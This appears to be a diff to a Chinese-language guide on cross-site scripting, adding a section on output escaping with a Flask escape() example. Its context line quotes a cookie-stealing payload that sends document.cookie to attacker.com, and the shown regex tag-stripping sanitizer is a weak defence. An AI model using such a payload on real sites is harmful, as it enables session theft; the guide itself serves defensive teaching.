@@ -428,7 +428,17 @@ document.location='http://attacker.com/steal.php?cookie='+document.cookie;
   import re
   def sanitize_input(user_input):
   return re.sub(r'<.*?>', '', user_input)
-
   ```
+* 輸出轉義（Output Escaping） 
+  - 在顯示用戶輸入的內容時，對特殊字符進行 HTML 轉義，例如：  
+    - < 轉換為 &lt;
+    - > 轉換為 &gt;
+    - " 轉換為 &quot;
+    - ' 轉換為 &#39;
+  - 在 Python Flask 框架中，可以使用 escape() 來自動轉義：  
+  ```python
+  from flask import escape
+  safe_output = escape(user_input)
+  ```  
 
 
